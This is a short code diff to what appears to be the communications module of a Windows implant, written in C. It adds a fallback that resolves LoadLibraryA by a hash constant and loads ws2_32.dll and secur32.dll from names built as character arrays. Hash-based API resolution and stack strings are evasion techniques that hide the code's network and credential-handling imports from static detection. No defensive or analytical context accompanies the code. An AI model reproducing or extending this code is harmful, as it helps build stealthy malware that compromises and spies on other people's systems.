@@ -94,8 +94,21 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
     if (api->resolved)
         return STATUS_SUCCESS;
 
-    /* Resolve ws2_32.dll */
+    /* The stub exe may not import ws2_32/secur32, so load them first.
+       Resolve LoadLibraryA from kernel32 (already loaded). */
+    typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    fn_LoadLibraryA pLoadLib = NULL;
+    if (k32) {
+        pLoadLib = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);  /* LoadLibraryA */
+    }
+
+    /* Resolve ws2_32.dll — try PEB first, fall back to LoadLibraryA */
     PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
+    if (!ws2 && pLoadLib) {
+        char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
+        ws2 = pLoadLib(ws2_name);
+    }
     if (!ws2) return STATUS_PROCEDURE_NOT_FOUND;
 
     api->pWSAStartup    = (fn_WSAStartup)find_export_by_hash(ws2, HASH_WSASTARTUP);
@@ -116,6 +129,10 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
     PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
     if (!sec)
         sec = find_module_by_hash(HASH_SSPICLI_DLL);
+    if (!sec && pLoadLib) {
+        char sec_name[] = {'s','e','c','u','r','3','2','.','d','l','l',0};
+        sec = pLoadLib(sec_name);
+    }
     if (!sec) return STATUS_PROCEDURE_NOT_FOUND;
 
     api->pAcquireCredentialsHandleA  = (fn_AcquireCredentialsHandleA)find_export_by_hash(sec, HASH_ACQUIRECREDHANDLE);
